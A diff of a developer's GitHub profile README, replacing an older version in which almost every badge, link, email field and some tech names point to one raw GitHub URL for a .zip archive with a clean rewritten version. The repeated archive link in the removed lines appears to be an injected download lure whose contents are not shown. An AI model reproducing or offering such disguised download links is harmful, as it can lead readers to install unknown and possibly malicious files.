@@ -1,72 +1,99 @@
 # 👋 Hi, I'm Atul
 
-🎓 https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip Computer Science Graduate   
-💻 Full-Stack Developer | SaaS Builder | Open to Job Opportunities  
-📍 Based in Pune, India  
-
-I'm passionate about building real-world applications that solve everyday problems. Currently focused on developing SaaS products and sharpening my full-stack development skills. Always open to opportunities where I can learn, grow, and contribute.
+🎓 Computer Science Graduate
+💻 Full-Stack Developer | SaaS Builder | Open to Opportunities
+📍 Pune, India
 
 ---
 
-## 🚀 Projects I'm Working On
+## 🚀 About Me
 
-- 🔧 **HungryScan** *(Private Repository)*  
-  A multi-tenant SaaS platform for hotels to manage food ordering via QR codes.  
-  _Tech_: React, Tailwind CSS, https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip, MongoDB  
-  _Status_: Actively Developing
+I'm passionate about building real-world applications that solve everyday problems.
+Currently focused on SaaS development and improving my full-stack skills.
 
-- 🧑‍💼 **TalentHub** *(Private Repository)*  
-  A local service listing and provider-seeker matching platform.  
-  _Tech_: PHP, MySQL, HTML, CSS 
-  _Status_: MVP in progress
+💡 I believe in **learning by building**, and I'm actively working on scalable products.
 
+---
 
+## 🚀 Projects
+
+### 🔧 HungryScan *(SaaS - In Progress)*
+
+A multi-tenant platform for hotels to manage QR-based food ordering.
+
+**Tech Stack:** React, Tailwind CSS, Node.js, Express, MongoDB
+**Features:**
+
+* QR-based ordering
+* Cart & continuous ordering
+* Admin dashboard (in progress)
+* Multi-tenant SaaS architecture
+
+---
+
+### 🧑‍💼 TalentHub *(MVP)*
+
+A local service marketplace connecting providers with customers.
+
+**Tech Stack:** PHP, MySQL, HTML, CSS
 
 ---
 
 ## 🛠️ Tech Stack
 
-**Frontend**  
-![HTML](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![CSS](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![JavaScript](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![React](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![Tailwind](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
+### 💻 Frontend
 
-**Backend**  
-![https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![Express](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![Java](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![PHP](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
+* HTML
+* CSS
+* JavaScript
+* React
+* Tailwind CSS
 
-**Database**  
-![MySQL](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![MongoDB](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
+### ⚙️ Backend
 
-**Tools**  
-![Git](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![GitHub](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![VS Code](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![Postman](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
-![Figma](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)
+* Node.js
+* Express.js
+* PHP
+* Java
+
+### 🗄️ Database
+
+* MySQL
+* MongoDB
+
+### 🧰 Tools
+
+* Git & GitHub
+* VS Code
+* Postman
+* Figma
 
 ---
 
 ## 🌱 Currently Learning
 
-- Backend architecture for SaaS  
-- React Native & Expo  
-- Authentication & role-based access (JWT, sessions)
+* SaaS Backend Architecture
+* Authentication (JWT, Role-Based Access)
+* React Native (Expo)
 
 ---
 
-## 📫 Let's Connect
+## 📈 Goals
 
-- 📧 Email: **https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip**  
-- 💼 [LinkedIn](https://raw.githubusercontent.com/AaTull/AaTull/main/appeasable/AaTull.zip)  
-- 🌐 
+* 🚀 Launch HungryScan as a SaaS product
+* 💼 Get my first developer job
+* 🏢 Build my own software company
 
 ---
 
-### 💭 Fun Fact
-> I’m building my own SaaS startup while also preparing for my first developer job — always learning, always building 🚀
+## 📫 Connect With Me
+
+* 📧 Email: [your-email@example.com](mailto:your-email@example.com)
+* 💼 LinkedIn: your-linkedin-url
+* 🌐 Portfolio: coming soon
+
+---
+
+## 💭 Fun Fact
+
+> I'm building my own SaaS startup while preparing for my first developer job — always learning, always building 🚀
